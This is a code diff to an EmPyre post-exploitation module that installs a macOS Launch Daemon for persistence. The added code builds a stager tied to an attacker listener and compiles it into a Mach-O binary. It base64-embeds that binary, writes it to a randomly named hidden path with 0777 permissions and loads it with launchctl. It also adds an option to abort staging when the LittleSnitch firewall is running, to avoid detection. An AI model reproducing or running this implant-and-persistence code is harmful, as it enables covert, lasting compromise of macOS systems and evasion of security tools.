@@ -1,3 +1,5 @@
+import base64
+import uuid
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -39,15 +41,30 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Listener' : {
+                'Description'   :   'Listener to use.',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'LittleSnitch' : {
+                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
+                'Required'      :   True,
+                'Value'         :   'True'
+            },
+            'UserAgent' : {
+                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
             'DaemonName' : {
                 'Description'   :   'Name of the Launch Daemon to install. Name will also be used for the plist file.',
                 'Required'      :   True,
                 'Value'         :   'com.proxy.initialize'
             },
-            'ProgramName' : {
-                'Description'   :   'The name of the program or bash script execute when the daemon is loaded.',
-                'Required'      :   True,
-                'Value'         :   '/Library/Application Support/AppleUpdate'
+            'DaemonLocation' : {
+                'Description'   :   'The full path of where the EmPyre launch daemon should be located. The default location is /Libary/Application Support/ and a random filename.',
+                'Required'      :   False,
+                'Value'         :   ''
             }
         }
 
@@ -69,8 +86,19 @@ class Module:
     def generate(self):
 
         daemonName = self.options['DaemonName']['Value']
-        programname = self.options['ProgramName']['Value']
+        if self.options['DaemonLocation']['Value'] != '':
+            programname = self.options['DaemonLocation']['Value']
+        else:
+            programname = "/Library/Application Support/" + str(uuid.uuid4()) + "/" + str(uuid.uuid4())
+
         plistfilename = "%s.plist" % daemonName
+        listenerName = self.options['Listener']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        LittleSnitch = self.options['LittleSnitch']['Value']
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, littlesnitch=LittleSnitch)
+        launcher = launcher.strip('echo').strip(' | python &').strip("\"")
+        machoBytes = self.mainMenu.stagers.generate_macho(launcherCode=launcher)
+        encBytes = base64.b64encode(machoBytes)
 
         plistSettings = """
 <?xml version="1.0" encoding="UTF-8"?>
@@ -94,10 +122,25 @@ class Module:
         script = """
 import subprocess
 import sys
+import base64
+import os
 
+encBytes = "%s"
+bytes = base64.b64decode(encBytes)
 plist = \"\"\"
 %s
 \"\"\"
+daemonPath = "%s"
+
+if not os.path.exists(os.path.split(daemonPath)[0]):
+    os.makedirs(os.path.split(daemonPath)[0])
+
+
+e = open(daemonPath,'wb')
+e.write(bytes)
+e.close()
+
+os.chmod(daemonPath, 0777)
 
 f = open('/tmp/%s','w')
 f.write(plist)
@@ -119,7 +162,8 @@ process = subprocess.Popen('launchctl load /Library/LaunchDaemons/%s', stdout=su
 process.communicate()
 
 print "\\n[+] Persistence has been installed: /Library/LaunchDaemons/%s"
+print "\\n[+] EmPyre daemon has been written to %s"
 
-""" % (plistSettings, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename)
+""" % (encBytes,plistSettings, programname, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, programname)
 
         return script
